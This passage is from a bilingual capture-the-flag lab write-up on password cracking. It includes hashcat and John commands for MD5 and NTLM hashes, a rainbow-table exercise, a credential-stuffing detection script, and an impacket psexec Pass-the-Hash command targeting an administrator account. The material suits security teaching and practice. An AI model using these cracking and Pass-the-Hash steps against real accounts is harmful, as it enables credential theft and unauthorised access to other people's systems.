    attacker_ips = {p.ip for p in attack_patterns}

    try:
        for line in Path(log_file).read_text(encoding="utf-8").splitlines():
            if not line.strip():
                continue
            try:
                entry = json.loads(line)
                if entry.get("ip") in attacker_ips:
                    username = entry.get("username", "")
                    password = entry.get("password", "")
                    if username and password:
                        leaked.append(f"{username}:{password}")
            except json.JSONDecodeError:
                continue
    except OSError:
        pass
    return leaked


def main() -> None:
    parser = argparse.ArgumentParser(
        description="크리덴셜 스터핑 탐지 및 감사 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="예시:\n  python3 credential_audit.py --generate-log\n"
               "  python3 credential_audit.py --log /tmp/login.log",
    )
    parser.add_argument("--log", help="로그인 로그 파일")
    parser.add_argument("--generate-log", action="store_true",
                        help="샘플 로그 생성")
    parser.add_argument("--threshold", type=int, default=3,
                        help="탐지 임계값 (시도 횟수)")
    args = parser.parse_args()

    log_file = args.log or "/tmp/crack_ctf/login.log"

    if args.generate_log or not Path(log_file).exists():
        Path("/tmp/crack_ctf").mkdir(parents=True, exist_ok=True)
        generate_sample_logs(log_file)
        print(f"[+] 샘플 로그 생성: {log_file}")

    print("[*] 크리덴셜 스터핑 탐지 분석")
    print("=" * 60)

    attempts = parse_login_logs(log_file)
    print(f"[*] {len(attempts)}개 로그인 시도 로드됨")

    patterns = detect_credential_stuffing(attempts, args.threshold)
    print(f"\n[+] {len(patterns)}개 공격 패턴 탐지:")

    for pattern in patterns:
        print(f"\n  [!] IP: {pattern.ip}")
        print(f"      판정: {pattern.verdict.upper()}")
        print(f"      시도: {pattern.attempt_count}회")
        print(f"      계정 수: {pattern.unique_accounts}개")
        print(f"      패스워드 수: {pattern.unique_passwords}개")

    if patterns:
        leaked = extract_leaked_credentials(log_file, patterns)
        print(f"\n[*] 공격에 사용된 크리덴셜 {len(leaked)}개:")
        for cred in leaked:
            print(f"    {cred}")
            flag_match = re.search(r"CTF\{[^}]+\}", cred)
            if flag_match:
                print(f"\n[+] 플래그: {flag_match.group(0)}")


if __name__ == "__main__":
    main()
```

---

## 환경 정리

```bash
docker stop crack-lab 2>/dev/null
docker rm crack-lab 2>/dev/null
rm -rf /tmp/crack_ctf
```

---

<a name="english"></a>

# Password Cracking CTF Practice Lab

## Lab Environment Setup

```bash
docker run -d --name crack-lab ubuntu:22.04 tail -f /dev/null
docker exec crack-lab bash -c "
  apt-get update -q && apt-get install -y -q python3 python3-pip hashcat john
  pip3 install passlib bcrypt requests
"
pip install passlib bcrypt hashlib
```

---

## Challenge 1: Hashcat/John Hash Cracking

### Objective

Identify multiple hash algorithms (MD5, SHA-1, SHA-256, bcrypt) from a hash file and crack them using wordlists to extract the flag.

**Flag format**: `CTF{h4sh_cr4ck3d_m0d3_3}`

### Solution

```bash
# Generate hash files with embedded flag
docker exec crack-lab python3 -c "
import hashlib, base64
flag_b64 = base64.b64encode(b'CTF{h4sh_cr4ck3d_m0d3_3}').decode()
h = hashlib.md5(flag_b64.encode()).hexdigest()
print(f'svc_acct:{h}')
print(f'Plaintext: {flag_b64}')
" > /tmp/hashes.txt

# Crack with wordlist
python3 hash_cracker.py --file /tmp/hashes.txt

# Or using Hashcat
hashcat -m 0 hashes.txt rockyou.txt --force
# Then Base64-decode the cracked password to get the flag
```

---

## Challenge 2: NTLM Hash Cracking and Pass-the-Hash

### Objective

Crack Windows NTLM hashes extracted from a SAM dump, and use Pass-the-Hash for hashes that resist cracking.

**Flag format**: `CTF{ntlm_p4ss_th3_h4sh_w1n}`

### Solution

```bash
# Simulate NTLM cracking
python3 ntlm_cracker.py --simulate

# Real Hashcat command
hashcat -m 1000 ntlm_hashes.txt rockyou.txt --force

# Pass-the-Hash (impacket)
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH> administrator@192.168.1.100
```

---

## Challenge 3: Rainbow Table Attack

### Objective

Build a rainbow table for 6-digit numeric MD5 hashes and use chain lookups to reverse a target hash.

**Flag format**: `CTF{r41nb0w_t4bl3_ch41n_r3v3rs3d}`

### Solution

```bash
# Generate rainbow table and crack
python3 rainbow_table.py --generate --charset digits --pwd-length 6 \
  --chain-length 1000 --num-chains 500

# Crack a specific hash
python3 rainbow_table.py --crack $(echo -n "314159" | md5sum | cut -d' ' -f1)
```

**Key insight:** Rainbow tables are time-memory tradeoffs. Without salting, the same plaintext always produces the same hash, making precomputed tables viable. Adding salt (e.g., bcrypt) defeats rainbow tables entirely.

---

## Challenge 4: Credential Stuffing Defense Audit

### Objective

Analyze login server logs for credential stuffing patterns and extract the flag hidden in the attacker's credential list.

**Flag format**: `CTF{cr3d_stuff1ng_d3t3ct3d_4nd_bl0ck3d}`

### Solution

```bash
# Generate sample logs with embedded attack
python3 credential_audit.py --generate-log

# Detect attacks and extract leaked credentials
python3 credential_audit.py --log /tmp/crack_ctf/login.log

# Expected output:
# [!] IP: 10.0.0.99
#     Verdict: CREDENTIAL_STUFFING
#     charlie@victim.com:CTF{cr3d_stuff1ng_d3t3ct3d_4nd_bl0ck3d}
# [+] Flag: CTF{cr3d_stuff1ng_d3t3ct3d_4nd_bl0ck3d}
```

---

## Cleanup

```bash
docker stop crack-lab 2>/dev/null && docker rm crack-lab 2>/dev/null
rm -rf /tmp/crack_ctf
```
